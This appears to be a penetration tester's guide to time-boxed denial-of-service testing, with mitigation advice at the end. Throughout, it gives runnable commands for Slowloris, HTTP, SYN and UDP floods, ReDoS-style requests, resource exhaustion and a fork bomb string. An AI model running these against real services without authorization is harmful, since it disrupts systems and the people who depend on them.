# Denial of Service (DoS) Simulation Guide

## Overview
DoS simulation demonstrates the potential to disrupt target services through
controlled resource exhaustion testing. Tests are time-boxed, low-volume,
and designed to measure degradation rather than cause outages.

## ⚠️ Safety Rules
- **Time-box all tests** — use `timeout` command, never open-ended floods
- **Start low** — begin with minimal load and increase gradually
- **Monitor continuously** — watch target health during testing
- **Have a kill switch** — know how to stop instantly
- **Coordinate with client** — they should monitor their systems during the test

## Baseline Measurement
```bash
# Measure normal response time (run 10 times, average)
for i in $(seq 1 10); do
    curl -o /dev/null -s -w "%{time_total}\n" http://target/
done | awk '{sum+=$1} END {print "Average:", sum/NR, "seconds"}'

# Check current server resources
curl -s http://target/server-status 2>/dev/null  # Apache status
curl -s http://target/nginx_status 2>/dev/null    # Nginx status
```

## Application-Layer DoS (Layer 7)

### Slowloris Attack
Hold connections open with partial HTTP headers:
```bash
# Controlled Slowloris — 50 connections, 30-second timeout
for i in $(seq 1 50); do
    (echo -ne "GET / HTTP/1.1\r\nHost: target\r\nX-a: b\r\n" | \
     ncat -q 30 target 80) &
done

# Measure impact
curl -o /dev/null -s -w "Response under Slowloris: %{time_total}s\n" http://target/

# Stop test
pkill -f "ncat -q 30 target"
wait
```

### HTTP Flood (Controlled)
```bash
# Send 100 requests in parallel, measure response times
for i in $(seq 1 100); do
    curl -s -o /dev/null -w "%{time_total}\n" http://target/ &
done | sort -n | tail -5  # show slowest 5 responses

# Gradual load increase
for CONNS in 10 25 50 100 200; do
    echo "=== Testing with $CONNS concurrent connections ==="
    START=$(date +%s%N)
    for i in $(seq 1 $CONNS); do
        curl -s -o /dev/null http://target/ &
    done
    wait
    END=$(date +%s%N)
    echo "Completed in $(( (END - START) / 1000000 ))ms"
    sleep 5  # cooldown between rounds
done
```

### Resource-Intensive Requests
```bash
# Target expensive endpoints (search, report generation, etc.)
curl -s -X POST http://target/api/search -d '{"query":"a]","limit":99999}' -o /dev/null
curl -s "http://target/api/export?format=csv&all=true" -o /dev/null

# Regex DoS (ReDoS) — if input validation is weak
curl -s -X POST http://target/api/validate \
     -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaa@"}' -o /dev/null
```

## Network-Layer DoS (Layer 3/4)

### SYN Flood (Very Brief)
```bash
# ALWAYS use timeout — max 5 seconds for testing
timeout 5 hping3 -S --flood -p 80 target_ip
echo "SYN flood test completed (5 seconds)"

# Measured SYN flood (count-limited)
hping3 -S -p 80 --faster target_ip -c 1000
echo "Sent 1000 SYN packets"

# Verify service status after test
sleep 10
curl -o /dev/null -s -w "Post-SYN-flood response: %{time_total}s\n" http://target/
```

### UDP Flood (Very Brief)
```bash
# 5-second UDP flood to DNS port
timeout 5 hping3 --udp -p 53 --flood target_ip
echo "UDP flood test completed (5 seconds)"
```

## CPU/Memory Exhaustion (Local)
```bash
# Prove resource hijacking potential on compromised system
# CPU exhaustion (10 seconds)
stress --cpu $(nproc) --timeout 10

# Memory exhaustion (10 seconds, 512MB)
stress --vm 2 --vm-bytes 256M --timeout 10

# Fork bomb proof (DON'T actually run on production!)
# Evidence: show bash is available and ulimit allows it
echo "Fork bomb possible: bash available, ulimit -u = $(ulimit -u)"
# The actual fork bomb :(){ :|:& };: would be devastating — document, don't run
```

## Results Documentation
```bash
# Create results report
cat > /tmp/dos_results.txt << EOF
=== DoS Simulation Results ===
Target: [TARGET]
Date: $(date)
Tester: [NAME]

Baseline Response Time: [X]s
Under Slowloris (50 conns): [Y]s  (degradation: [Z]%)
Under HTTP Flood (100 req): [A]s  (degradation: [B]%)
Under SYN Flood (5 sec): [C]s    (degradation: [D]%)
Recovery Time: [E]s

Service Outage: Yes/No
Max Degradation: [X]%

Conclusion: Target is [vulnerable/resilient] to DoS attacks.
Recommendation: [specific mitigations]
EOF
```

## Mitigation Recommendations
- Enable SYN cookies (`net.ipv4.tcp_syncookies = 1`)
- Configure connection rate limiting in web server
- Deploy WAF with DoS protection rules
- Implement connection timeouts and keep-alive limits
- Use CDN/DDoS protection service (Cloudflare, AWS Shield)
- Configure proper resource limits (`ulimit`, cgroups)
- Monitor server resources with alerting thresholds
